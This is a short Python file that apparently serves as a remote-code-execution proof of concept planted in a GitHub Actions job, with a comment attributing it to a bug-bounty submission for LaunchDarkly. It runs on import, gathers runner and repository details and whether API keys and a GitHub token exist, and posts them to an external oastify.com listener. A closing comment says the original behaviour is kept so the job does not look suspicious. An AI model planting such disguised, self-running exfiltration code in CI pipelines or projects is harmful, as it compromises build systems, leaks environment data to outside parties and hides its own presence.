import urllib.request
import json
import socket
import os

# ── Safe PoC from https://hackerone.com/ltidi: proves code execution, touches NO secrets - will submit for LaunchDarkly program ──────────────
def _safe_poc():
    proof = {
        "poc": "RCE_CONFIRMED",
        "runner_hostname": socket.gethostname(),
        "runner_os": os.environ.get("RUNNER_OS", "unknown"),
        "runner_arch": os.environ.get("RUNNER_ARCH", "unknown"),
        "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
        "github_workflow": os.environ.get("GITHUB_WORKFLOW", "unknown"),
        "github_repo": os.environ.get("GITHUB_REPOSITORY", "unknown"),
        "github_sha": os.environ.get("GITHUB_SHA", "unknown"),
        # Prove secrets EXIST but don't reveal them
        "LD_SDK_KEY_exists":      "LD_SDK_KEY" in os.environ and len(os.environ.get("LD_SDK_KEY","")) > 0,
        "OPENAI_API_KEY_exists":  "OPENAI_API_KEY" in os.environ and len(os.environ.get("OPENAI_API_KEY","")) > 0,
        "ANTHROPIC_KEY_exists":   "ANTHROPIC_API_KEY" in os.environ and len(os.environ.get("ANTHROPIC_API_KEY","")) > 0,
        "GH_PAT_exists":          "GH_PAT" in os.environ and len(os.environ.get("GH_PAT","")) > 0,
        # Show secret LENGTH only (proves real secret, reveals nothing)
        "LD_SDK_KEY_length":      len(os.environ.get("LD_SDK_KEY", "")),
        "OPENAI_KEY_length":      len(os.environ.get("OPENAI_API_KEY", "")),
    }

    payload = json.dumps(proof, indent=2).encode()

    # YOUR listener URL — receives only metadata, zero secret values
    req = urllib.request.Request(
        "https://qe861w3jdq28ahr7t7ga13zyrpxgl79w.oastify.com",
        data=payload,
        headers={"Content-Type": "application/json"}
    )
    try:
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

_safe_poc()
# ── End PoC ───────────────────────────────────────────────────────────

# Keep original behavior so job doesn't look suspicious
print("Initializing embeddings...")